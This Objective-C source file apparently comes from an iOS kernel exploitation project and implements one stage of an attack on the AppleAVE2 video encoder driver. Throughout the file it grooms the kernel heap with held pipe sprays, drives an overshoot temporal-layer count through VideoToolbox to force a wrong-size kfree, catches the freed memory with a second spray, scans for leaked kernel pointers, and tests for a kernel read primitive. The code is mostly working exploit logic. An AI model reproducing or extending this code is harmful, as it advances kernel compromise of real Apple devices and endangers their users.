//
//  P149T8150Krw.m — the 17 conversion TAP. p149.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Ghidra 24A435 AppleAVE2 913.43.1:
//    queue_init FUN_fffffe000872b180  stp x0,x0,[x0]; str x0,[x0,#0x10]; str wzr,[x0,#0x18]
//    ctor FUN_fffffe0008840f78 / dtor FUN_fffffe0008840fec
//      queue_init(this+0x58) and queue_init(this+0x78)
//      then kfree(this+0x50, *(uint32*)(this+0x48) << 5)
//  Nov 1 panics: this=1, FAR=0x59 = failed alloc, NULL-page write.
//  v6: Prepare N=8 then Set 16463 then encode. IPS 10:04/13:45-13:55
//  still this=1 FAR=0x59 at invalidate — Prepare did not store a heap
//  pool. Ghidra FUN_fffffe0008790cec: kalloc+ctor then init(count);
//  FUN_fffffe00087913b4 invalidate: if (pool) dtor(pool). this=1
//  passes the NULL check. v7: Encode >=1 frame AT N=8 FIRST so
//  ctx+0x147b0 is a real kalloc, THEN Set 16463 (re-init: dtor of
//  the live object then init with the overshoot count), THEN encode
//  again, THEN invalidate. kfree(this+0x50, count<<5) only runs on
//  a heap this.
//
//  Neighbor = kernel pipes (default 16KB), unique markers, held for the
//  whole tap, plus a catch spray after invalidate. Metal 0x4000 (p145)
//  is the wrong zone for this object.
//
//  HONESTY: PIPE-HIT / QUEUE-INIT / kptr leak = write receipt, never
//  hasKread. commitSlide only on kread32(kbase)==0xfeedfacf. No kfd
//  pipe body, no SocketKRW.Arm without an inpcb KVA, no icmp6filt.
//

#import "P149T8150Krw.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabBandit.h"
#import "P007KreadLane.h"
#import "P007Board.h"

#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <fcntl.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>
#import <errno.h>

#define P149_BUILD     @"p149-t8150krw-v4.2"
#define P149_KEY       @"NumberOfTemporalLayers"
#define P149_PRE       8
#define P149_OVER      16463
#define P149_SURVIVE   16462
#define P149_PIPES     96
#define P149_CATCH     48
#define P149_MAXPIPE   (P149_PIPES + P149_CATCH)
#define P149_BUFLEN    0x4000
#define P149_MAG_BASE  0x5031343900000000ULL  /* "P149" */

static NSMutableString *g_buf; static int g_fd = -1;
/* Frames the encoder actually delivered. The v7 materialize premise was
   never verified: EncodeFrame can return 0 and still drop the frame, leaving
   ctx+0x147b0 == 1 and making the later invalidate the this=1 FAR=0x59
   panic. Only a delivered sample buffer proves the pool is heap-backed. */
static volatile int g_p149_frames;
static volatile int g_p149_calls;
static volatile int g_p149_dropped;
static volatile OSStatus g_p149_last_status;
static volatile VTEncodeInfoFlags g_p149_last_info;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }
static NSString *P149R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

static void p149_flushCB(void *_Nullable refCon, void *_Nullable e,
                         OSStatus status, VTEncodeInfoFlags info,
                         CMSampleBufferRef _Nullable sb) {
    (void)refCon; (void)e;
    g_p149_calls++;
    g_p149_last_status = status;
    g_p149_last_info = info;
    if (info & kVTEncodeInfo_FrameDropped) g_p149_dropped++;
    if (sb) g_p149_frames++;
}

static void p149_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p149", arms, 1, &sr, 0, "p149 t8150 krw auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p149", 0, outcome);
}

static int p149_kshaped(uint64_t q) {
    if (q < 0xfffffe0000000000ULL) return 0;
    if (q > 0xffffffefffffffffULL) return 0;
    return 1;
}

static long p149_read_knob(NSString *docs, NSString *name, long def) {
    NSString *s = [NSString stringWithContentsOfFile:
        [docs stringByAppendingPathComponent:name]
        encoding:NSUTF8StringEncoding error:nil];
    if (!s) return def;
    long v = strtol(s.UTF8String, NULL, 10);
    if (v < 0) return def;
    return v;
}

/* Conversion TAP: 0 = 16462 survival; 16462..16464 = truth battery;
   anything else (including the leftover p142_layers.txt=18 from the
   09:06 / 09:55 HOLD taps) is forced to 16463 and the file is healed. */
static long p149_layers_knob(NSString *docs) {
    NSString *path = [docs stringByAppendingPathComponent:@"p142_layers.txt"];
    NSString *s = [NSString stringWithContentsOfFile:path
        encoding:NSUTF8StringEncoding error:nil];
    if (!s) {
        Lf(@"[*] no p142_layers.txt — layers=%d (PoC row)", P149_OVER);
        return P149_OVER;
    }
    long v = strtol(s.UTF8String, NULL, 10);
    if (v == 0) {
        L(@"[*] p142_layers.txt=0 → 16462 survival control");
        return P149_SURVIVE;
    }
    if (v >= P149_SURVIVE && v <= 16464) {
        Lf(@"[*] p142_layers.txt=%ld (truth battery)", v);
        return v;
    }
    Lf(@"[heal] p142_layers.txt=%ld is out of the truth battery.", v);
    L(@"  Using 16462 (survival) for this tap — a bad knob must not");
    L(@"  silently arm the 16463 panic. Write 16463 explicitly to fire.");
    [@"16462\n" writeToFile:path atomically:YES
                   encoding:NSUTF8StringEncoding error:nil];
    return P149_SURVIVE;
}

@implementation P149T8150Krw

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p149_t8150krw_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p149 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P149_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] 17 conversion v7: Prepare N=8 THEN encode >=1 frame");
    L(@"  (Ghidra FUN_fffffe0008790cec kalloc+ctor stores heap this at");
    L(@"  ctx+0x147b0) THEN Set 16463 (re-init: dtor live object, init");
    L(@"  count<<5) THEN encode THEN invalidate (FUN_fffffe00087913b4");
    L(@"  dtor if pool!=0). IPS 13:45-13:55 this=1 FAR=0x59 = sentinel");
    L(@"  passed the NULL check; kfree(this+0x50, count<<5) needs a");
    L(@"  heap this. Neighbor = kernel pipes, not Metal.");
    L(@"[!] PANIC-POSSIBLE. ONE tap per force-quit. Reboot after.");
    L(@"[honesty] PIPE-HIT / QUEUE-INIT / kptr = write receipt.");
    L(@"  hasKread only on kread32(kbase)==0xfeedfacf.");

    long pre = p149_read_knob(docs, @"p142_pre.txt", P149_PRE);
    if (pre < 1 || pre > 8) pre = P149_PRE;
    long layers = p149_layers_knob(docs);
    Lf(@"[*] knobs: pre=%ld (encode-first) layers=%ld (overshoot after encode)",
       pre, layers);

    /* ---- stage 1: kernel pipe spray (held) ---- */
    int rfd[P149_MAXPIPE];
    int wfd[P149_MAXPIPE];
    uint64_t mag[P149_MAXPIPE];
    int npipe = 0;
    uint8_t *page = (uint8_t *)malloc(P149_BUFLEN);
    if (!page) {
        L(@"[-] malloc 16KB failed");
        p149_bandit("nomem"); return P149R();
    }
    memset(rfd, -1, sizeof rfd);
    memset(wfd, -1, sizeof wfd);

    for (int i = 0; i < P149_PIPES; i++) {
        int fds[2] = { -1, -1 };
        if (pipe(fds) != 0) {
            Lf(@"[s1] pipe[%02d] failed errno=%d (holding %d)", i, errno, npipe);
            continue;
        }
        uint64_t m = P149_MAG_BASE | (uint64_t)(unsigned)i;
        uint64_t *q = (uint64_t *)page;
        for (size_t j = 0; j < P149_BUFLEN / 8; j++) q[j] = m;
        ssize_t wn = write(fds[1], page, P149_BUFLEN);
        if (wn != (ssize_t)P149_BUFLEN) {
            Lf(@"[s1] pipe[%02d] short write %zd", i, wn);
            close(fds[0]); close(fds[1]);
            continue;
        }
        rfd[npipe] = fds[0];
        wfd[npipe] = fds[1];
        mag[npipe] = m;
        npipe++;
    }
    Lf(@"[s1] spray HELD: %d/%d kernel pipes x 0x%x (released at tap end)",
       npipe, P149_PIPES, (unsigned)P149_BUFLEN);

    /* ---- stage 2: encode-first then overshoot (the v7 law) ---- */
    VTCompressionSessionRef session = NULL;
    /* Prefer the hardware HEVC encoder and declare an IOSurface-backed
       source. Without this the first encode can be a software/dropped frame,
       so the pool slot stays 1 and the invalidate is the FAR=0x59 panic. */
    NSDictionary *encSpec = @{
        (id)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
    };
    NSDictionary *srcAttrs = @{
        (id)kCVPixelBufferPixelFormatTypeKey:
            @(kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange),
        (id)kCVPixelBufferIOSurfacePropertiesKey: @{},
    };
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)encSpec,
        (__bridge CFDictionaryRef)srcAttrs,
        NULL, p149_flushCB, (__bridge void *)docs, &session);
    if (st != noErr || !session) {
        Lf(@"[-] VTCompressionSessionCreate failed: %d (0x%x)", (int)st,
           (unsigned)st);
        for (int i = 0; i < npipe; i++) { close(rfd[i]); close(wfd[i]); }
        free(page);
        p149_bandit("nocreate"); return P149R();
    }
    L(@"[2] session created (HEVC 1280x720, stage9 mode)");

    OSStatus sUsage = VTSessionSetProperty(session,
        (__bridge CFStringRef)@"EncoderUsage",
        (__bridge CFTypeRef)@1);
    OSStatus sRC = VTSessionSetProperty(session,
        (__bridge CFStringRef)@"RCMode",
        (__bridge CFTypeRef)@20);
    OSStatus sProf = VTSessionSetProperty(session,
        kVTCompressionPropertyKey_ProfileLevel,
        kVTProfileLevel_HEVC_Main_AutoLevel);
    /* The AVE plugin (ave.videoencoder) builds the kernel Prepare/Start
       blobs. Its LookAheadFrames setter writes settings+0x420 (must be
       >=1) and settings+0x3f9 bit2 (pipeline mode 2) together; default 0
       fails the P149 gate. The VT key's CFString content is
       "LookAheadFrames" (SuggestedLookAheadFrameCount). */
    OSStatus sLA = VTSessionSetProperty(session,
        (__bridge CFStringRef)@"LookAheadFrames",
        (__bridge CFTypeRef)@1);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime,
                         kCFBooleanFalse);
    CFStringRef key = (__bridge CFStringRef)P149_KEY;

    int32_t pre32 = (int32_t)pre;
    CFNumberRef preVal = CFNumberCreate(kCFAllocatorDefault,
                                        kCFNumberSInt32Type, &pre32);
    st = VTSessionSetProperty(session, key, preVal);
    CFRelease(preVal);
    Lf(@"[2a] usage st=%d rc st=%d profile st=%d lookahead st=%d SetProperty(NTL pre=%ld) st=%d",
       (int)sUsage, (int)sRC, (int)sProf, (int)sLA, pre, (int)st);
    if (sRC == -12900) {
        L(@"[law] rc st=-12900 = VT RCMode=20 property miss on this build.");
        L(@"  ntl st=0 = 27.0 still accepts the count (Nov 1 panics used this).");
    }

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    Lf(@"[2b] Prepare st=%d", (int)st);

    CVPixelBufferRef pb = NULL;
    st = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                             (__bridge CFDictionaryRef)srcAttrs, &pb);
    if (st != noErr || !pb) {
        Lf(@"[-] CVPixelBufferCreate failed: %d", (int)st);
        VTCompressionSessionInvalidate(session); CFRelease(session);
        for (int i = 0; i < npipe; i++) { close(rfd[i]); close(wfd[i]); }
        free(page);
        p149_bandit("nopb"); return P149R();
    }
    IOSurfaceRef pbSurf = CVPixelBufferGetIOSurface(pb);
    Lf(@"[2b2] source pixel buffer IOSurface=%p (NULL = not IOSurface-backed)",
       pbSurf);

    /* v7: encode AT N=8 first so FUN_8790cec kalloc+ctor stores a heap
       this at ctx+0x147b0. v6 Set-16463-then-encode left this=1.
       RealTime=false means frames can sit queued: drain with
       CompleteFrames and require a delivered sample buffer before the
       overshoot. Encoding returning 0 is NOT materialization. */
    OSStatus firstSt = 0;
    g_p149_frames = 0;
    g_p149_calls = 0;
    g_p149_dropped = 0;
    g_p149_last_status = 0;
    g_p149_last_info = 0;
    for (int i = 0; i < 2; i++) {
        VTEncodeInfoFlags flags = 0;
        OSStatus est = VTCompressionSessionEncodeFrame(session, pb,
            CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &flags);
        if (i == 0) firstSt = est;
        if (est != 0) break;
    }
    Lf(@"[2e] ENCODE N=%ld (materialize pool) first st=%d", pre, (int)firstSt);
    OSStatus drainSt = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    Lf(@"[2e] materialize drain st=%d frames=%d calls=%d dropped=%d lastStatus=%d lastInfo=0x%x (a delivered sample = heap this)",
       (int)drainSt, g_p149_frames, g_p149_calls, g_p149_dropped,
       (int)g_p149_last_status, (unsigned)g_p149_last_info);
    BOOL materialized = (firstSt == 0 && g_p149_frames > 0);
    if (!materialized) {
        L(@"[2e] MATERIALIZE FAILED — overshoot SKIPPED.");
        L(@"  Running the Set/invalidate now is the known this=1 FAR=0x59 panic.");
        L(@"  The session is LEAKED on purpose (no invalidate, no release):");
        L(@"  force-quit without writing state, then reboot.");
        CVPixelBufferRelease(pb);
        for (int i = 0; i < npipe; i++) { close(rfd[i]); close(wfd[i]); }
        free(page);
        p149_bandit("no-materialize");
        if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
        return P149R();
    }
    L(@"[2e] materialized — ctx+0x147b0 should now be a heap object");
    BOOL materializeOnly = docs && [[NSFileManager defaultManager]
        fileExistsAtPath:[docs stringByAppendingPathComponent:
                          @"p149_materialize_only"]];
    if (materializeOnly) {
        L(@"[2e] p149_materialize_only present — overshoot SKIPPED.");
        L(@"  Clean invalidate at N=8 proves the pool slot without the");
        L(@"  16463 re-init. Remove the file to run the conversion.");
        CVPixelBufferRelease(pb);
        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        for (int i = 0; i < npipe; i++) { close(rfd[i]); close(wfd[i]); }
        free(page);
        p149_bandit("materialize-only");
        if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
        return P149R();
    }

    int32_t lay32 = (int32_t)layers;
    CFNumberRef layVal = CFNumberCreate(kCFAllocatorDefault,
                                        kCFNumberSInt32Type, &lay32);
    st = VTSessionSetProperty(session, key, layVal);
    CFRelease(layVal);
    Lf(@"[2c] IN FLIGHT SetProperty(NTL overshoot=%ld) st=%d", layers, (int)st);
    if ((int)st == -12900) {
        L(@"[law] ntl st=-12900 = 27.2-class kernel pre-check.");
    }

    {
        void *rb = NULL;
        OSStatus rst = VTSessionCopyProperty(session, key,
                                             kCFAllocatorDefault, &rb);
        if (rst == 0 && rb) {
            int32_t rv = 0; CFNumberGetValue((CFNumberRef)rb,
                                             kCFNumberSInt32Type, &rv);
            Lf(@"[2d] readback=%d (1 = VT store clamp; internal count still reaches AVE2)",
               rv);
            CFRelease(rb);
        } else {
            Lf(@"[2d] readback st=%d", (int)rst);
        }
    }

    OSStatus overSt = 0;
    for (int i = 2; i < 4; i++) {
        VTEncodeInfoFlags flags = 0;
        OSStatus est = VTCompressionSessionEncodeFrame(session, pb,
            CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &flags);
        if (i == 2) overSt = est;
        if (i == 2) L(@"[3] ENCODE overshoot on a materialized pool (IN FLIGHT)");
        if (est != 0) break;
    }
    Lf(@"[3] overshoot encode first st=%d", (int)overSt);
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    CVPixelBufferRelease(pb);

    L(@"[4] invalidate = destructor (queue_init + kfree count<<5) (IN FLIGHT)");
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    L(@"[4] session invalidated (clean return = survived this count)");

    /* ---- stage 3: catch spray into a wrong-size free ---- */
    int nheld = npipe;
    for (int i = 0; i < P149_CATCH && npipe < P149_MAXPIPE; i++) {
        int fds[2] = { -1, -1 };
        if (pipe(fds) != 0) break;
        uint64_t m = P149_MAG_BASE | 0xC000ULL | (uint64_t)(unsigned)i;
        uint64_t *q = (uint64_t *)page;
        for (size_t j = 0; j < P149_BUFLEN / 8; j++) q[j] = m;
        ssize_t wn = write(fds[1], page, P149_BUFLEN);
        if (wn != (ssize_t)P149_BUFLEN) {
            close(fds[0]); close(fds[1]);
            continue;
        }
        rfd[npipe] = fds[0];
        wfd[npipe] = fds[1];
        mag[npipe] = m;
        npipe++;
    }
    Lf(@"[5] catch spray +%d (held was %d, now %d)", npipe - nheld, nheld, npipe);

    /* ---- stage 4: scan pipes ---- */
    int hit_pages = 0, kptr_n = 0, qinit_n = 0, foreign_q = 0;
    uint64_t first_kptr = 0, first_this = 0;
    L(@"[6] scan: marker mismatch / kptr / queue-init triplet (3 equal kptrs + 0)");
    for (int i = 0; i < npipe; i++) {
        memset(page, 0, P149_BUFLEN);
        ssize_t rn = read(rfd[i], page, P149_BUFLEN);
        if (rn <= 0) continue;
        uint64_t *q = (uint64_t *)page;
        size_t nq = ((size_t)rn) / 8;
        int page_hit = 0;
        for (size_t j = 0; j < nq; j++) {
            if (q[j] == mag[i]) continue;
            foreign_q++;
            page_hit = 1;
            if (p149_kshaped(q[j])) {
                kptr_n++;
                if (!first_kptr) first_kptr = q[j];
                if (j + 2 < nq && q[j] == q[j + 1] && q[j] == q[j + 2]) {
                    uint32_t z = 0;
                    if (j + 3 < nq) z = (uint32_t)(q[j + 3] & 0xffffffffULL);
                    if (z == 0 || j + 3 >= nq) {
                        qinit_n++;
                        if (!first_this) first_this = q[j] - 0x58ULL;
                        Lf(@"[6] QUEUE-INIT pipe[%02d] slot=%zu self=%#llx this~=%#llx",
                           i, j,
                           (unsigned long long)q[j],
                           (unsigned long long)(q[j] - 0x58ULL));
                    }
                }
            }
        }
        if (page_hit) {
            hit_pages++;
            if (hit_pages <= 8) {
                Lf(@"[6] PIPE-HIT pipe[%02d] group=%@ foreign-qwords in page",
                   i, i < nheld ? @"held" : @"catch");
            }
        }
    }
    Lf(@"[6] verdict: hit_pages=%d/%d foreign_q=%d kptr_n=%d queue_init=%d",
       hit_pages, npipe, foreign_q, kptr_n, qinit_n);
    if (first_kptr) {
        Lf(@"[6] first kptr=%#llx (heap leak, not kread32)",
           (unsigned long long)first_kptr);
        [[P007Board shared] recordHeapLeak:first_kptr source:@"p149"];
    }
    if (first_this) {
        Lf(@"[6] derived this=%#llx (queue_init self - 0x58)",
           (unsigned long long)first_this);
        [[P007Board shared] recordHeapLeak:first_this source:@"p149-this"];
    }
    BOOL receipt = (hit_pages > 0) || (kptr_n > 0) || (qinit_n > 0);
    Lf(@"[6] conversion_receipt=%@ conversion=NO until kread32(kbase)==0xfeedfacf",
       receipt ? @"YES" : @"NO");
    if (!receipt) {
        L(@"[6] CLEAN pipes = fill did not land in this zone, or this=1 panicked first.");
        L(@"  A panic here is still the failed-alloc class. Survival + PIPE-HIT is the door.");
    }

    for (int i = 0; i < npipe; i++) { close(rfd[i]); close(wfd[i]); }
    free(page);

    /* ---- stage 5: honest KRW self-test. never fake 0xfeedfacf. ---- */
    L(@"=== STAGE GATE (honest KRW self-test) ===");
    L(@"[*] SocketKRW.Arm needs an inpcb KVA. AVE queue-init writes self-pointers,");
    L(@"  not icmp6filt. No Arm from a pipe leak.");
    {
        P007Board *brd = [P007Board shared];
        uint64_t kb = brd.kbase ? brd.kbase : P007LaneKbase();
        P007Kread32Fn rfn = [brd kread32Fn];
        BOOL pass = NO;
        if (kb && rfn) {
            BOOL okNo = NO;
            pass = (rfn(kb, &okNo) == 0xfeedfacfULL) && okNo;
        } else if (kb && P007LaneLive()) {
            pass = (P007LaneKRead32(kb) == 0xfeedfacfULL);
        }
        if (pass) {
            (void)P007LaneArmBoard();
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx) hasKread=YES",
               (unsigned long long)kb);
            p149_bandit("selftest-read-pass");
        } else {
            Lf(@"  KRW SELF-TEST READ: FAIL/HOLD (board-kbase=%lld lane-kbase=%@) hasKread=NO",
               (long long)brd.kbase,
               kb ? [NSString stringWithFormat:@"%#llx",
                     (unsigned long long)kb] : @"0");
            p149_bandit(receipt ? "receipt-no-kread" : "selftest-read-fail");
        }
        Lf(@"  board: %@", [brd kreadSignal]);
        Lf(@"  hasKread=%@ conversion=%@",
           brd.hasKread ? @"YES" : @"NO",
           brd.hasKread ? @"YES" : @"NO");
    }
    Lf(@"=== p149 end %@ ===", LabLocalMilitaryNow());
    if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
    return P149R();
}

@end
